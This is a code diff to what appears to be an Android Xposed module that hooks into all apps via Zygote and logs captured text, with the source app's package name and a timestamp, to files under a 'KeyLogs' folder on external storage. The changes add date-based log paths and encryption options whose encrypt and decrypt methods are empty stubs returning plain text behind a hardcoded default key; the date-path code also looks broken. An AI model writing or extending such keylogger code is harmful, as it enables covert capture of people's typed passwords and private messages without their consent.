@@ -23,6 +23,10 @@ public class Hook implements IXposedHookZygoteInit {
 	public static final String mSharedPrefs = "settings";
 	public static final String mActive = "active";
 	public static final String mLogPath = "path";
+	public static final String mUseDate = "useDate";
+	public static final String mEncrypt = "encryption";
+	public static final String mEncryptKey = "encryptKey";
+
 
 	private BufferedWriter mWriter;
 	private String mCache = "";
@@ -85,6 +89,12 @@ public class Hook implements IXposedHookZygoteInit {
 
 
 	private void write(String packageName, String text) {
+		//getting the current date and time
+		@SuppressLint("SimpleDateFormat")
+		final String currentDateTimeString = new SimpleDateFormat("dd-MM-yy @ HH:mm:ss").format(new Date());
+
+		//getting the file path
+		String filePath;
 
 		//Don't need to do anything if the "text" is as same as before or is empty.
 		if (text.equals("") || text.equals(mCache))
@@ -93,18 +103,26 @@ public class Hook implements IXposedHookZygoteInit {
 		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
 		if (mWriter == null)
 			try {
-				mWriter = new BufferedWriter(new FileWriter(mXsp.getString(mLogPath, Environment.getExternalStorageDirectory() + "keylogs/log.txt"), true));
+				if(!mXsp.getBoolean(mUseDate, true))
+					filePath = Environment.getExternalStorageDirectory() +  mXsp.getString(mLogPath, "KeyLogs/logs.log");
+				else{
+					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs") +
+							"/20" + currentDateTimeString.substring(6,7) + "/" +
+							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ".log" ;
+				}
+				mWriter = new BufferedWriter(new FileWriter(filePath, true));
+
 			} catch (IOException e1) {
 				return;
 			}
 
-		//getting the current date and time
-		@SuppressLint("SimpleDateFormat")
-		final String currentDateTimeString = new SimpleDateFormat("dd-MM-yy @ HH:mm:ss").format(new Date());
-
+		String logLine = currentDateTimeString + ">" + packageName + ">" + text;
+		if(mXsp.getBoolean(mEncrypt, false)){
+			logLine = encrypt(logLine, mXsp.getString(mEncryptKey, "6677667766776677"));
+		}
 		try {
 			//Write it
-			mWriter.append(currentDateTimeString + ">" + packageName + ">" + text);
+			mWriter.append(logLine);
 			mWriter.newLine();
 			mWriter.flush();
 			//Refresh the cache
@@ -112,5 +130,17 @@ public class Hook implements IXposedHookZygoteInit {
 		} catch (Exception e) {
 			//ignore
 		}
+	}
+	private String encrypt(String text, String key){
+		//encryption Logic.
+
+
+		return text;
+	}
+	public static String decrypt(String text, String key){
+		//decryption Logic
+
+
+		return text;
 	}
 }
